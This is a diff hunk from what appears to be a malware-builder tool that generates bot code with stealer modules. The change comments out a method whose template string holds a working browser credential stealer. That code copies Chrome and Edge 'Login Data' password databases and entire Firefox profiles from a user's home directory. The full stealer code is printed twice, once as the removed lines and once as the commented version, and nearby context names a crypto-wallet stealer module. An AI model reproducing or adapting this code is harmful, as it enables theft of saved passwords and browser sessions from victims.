@@ -1592,66 +1592,66 @@ encryptionOptions.algorithm ? this.encryptBotCode(botCode, encryptionOptions) : 
     // JavaScript Browser Stealer Code
     getJavaScriptBrowserStealerCode() {
         return `
-    stealBrowserData() {
-        console.log('Browser Stealer started...');
-        try {
-            const os = require('os');
-            const homeDir = os.homedir();
-            
-            // Chrome password stealing
-            const chromePath = path.join(homeDir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
-            if (fs.existsSync(chromePath)) {
-                fs.copyFileSync(chromePath, 'chrome_passwords.db');
-                console.log('Chrome passwords copied');
-            }
-            
-            // Firefox password stealing
-            const firefoxPath = path.join(homeDir, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
-            if (fs.existsSync(firefoxPath)) {
-                const profiles = fs.readdirSync(firefoxPath);
-                profiles.forEach(profile => {
-                    const profilePath = path.join(firefoxPath, profile);
-                    if (fs.statSync(profilePath).isDirectory()) {
-                        // Copy Firefox profile
-                        this.copyDirectory(profilePath, "firefox_profile_" + profile);
-                        console.log("Firefox profile " + profile + " copied");
-                    }
-                });
-            }
-            
-            // Edge password stealing
-            const edgePath = path.join(homeDir, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data');
-            if (fs.existsSync(edgePath)) {
-                fs.copyFileSync(edgePath, 'edge_passwords.db');
-                console.log('Edge passwords copied');
-            }
-            
-        } catch (error) {
-            console.error('Browser stealer error:', error);
-        }
-    }
-    
-    copyDirectory(src, dest) {
-        try {
-            if (!fs.existsSync(dest)) {
-                fs.mkdirSync(dest, { recursive: true });
-            }
-            
-            const entries = fs.readdirSync(src);
-            entries.forEach(entry => {
-                const srcPath = path.join(src, entry);
-                const destPath = path.join(dest, entry);
-                
-                if (fs.statSync(srcPath).isDirectory()) {
-                    this.copyDirectory(srcPath, destPath);
-                } else {
-                    fs.copyFileSync(srcPath, destPath);
-                }
-            });
-        } catch (error) {
-            console.error('Directory copy error:', error);
-        }
-    }`;
+    // stealBrowserData() {
+    //     console.log('Browser Stealer started...');
+    //     try {
+    //         const os = require('os');
+    //         const homeDir = os.homedir();
+    //         
+    //         // Chrome password stealing
+    //         const chromePath = path.join(homeDir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
+    //         if (fs.existsSync(chromePath)) {
+    //             fs.copyFileSync(chromePath, 'chrome_passwords.db');
+    //             console.log('Chrome passwords copied');
+    //         }
+    //         
+    //         // Firefox password stealing
+    //         const firefoxPath = path.join(homeDir, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
+    //         if (fs.existsSync(firefoxPath)) {
+    //             const profiles = fs.readdirSync(firefoxPath);
+    //             profiles.forEach(profile => {
+    //                 const profilePath = path.join(firefoxPath, profile);
+    //                 if (fs.statSync(profilePath).isDirectory()) {
+    //                     // Copy Firefox profile
+    //                     this.copyDirectory(profilePath, "firefox_profile_" + profile);
+    //                     console.log("Firefox profile " + profile + " copied");
+    //                 }
+    //             });
+    //         }
+    //         
+    //         // Edge password stealing
+    //         const edgePath = path.join(homeDir, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data');
+    //         if (fs.existsSync(edgePath)) {
+    //             fs.copyFileSync(edgePath, 'edge_passwords.db');
+    //             console.log('Edge passwords copied');
+    //         }
+    //         
+    //     } catch (error) {
+    //         console.error('Browser stealer error:', error);
+    //     }
+    // }
+    // 
+    // copyDirectory(src, dest) {
+    //     try {
+    //         if (!fs.existsSync(dest)) {
+    //             fs.mkdirSync(dest, { recursive: true });
+    //         }
+    //         
+    //         const entries = fs.readdirSync(src);
+    //         entries.forEach(entry => {
+    //             const srcPath = path.join(src, entry);
+    //             const destPath = path.join(dest, entry);
+    //             
+    //             if (fs.statSync(srcPath).isDirectory()) {
+    //                 this.copyDirectory(srcPath, destPath);
+    //             } else {
+    //                 fs.copyFileSync(srcPath, destPath);
+    //             }
+    //         });
+    //     } catch (error) {
+    //         console.error('Directory copy error:', error);
+    //     }
+    // }`;
     }
 
     // JavaScript Crypto Stealer Code
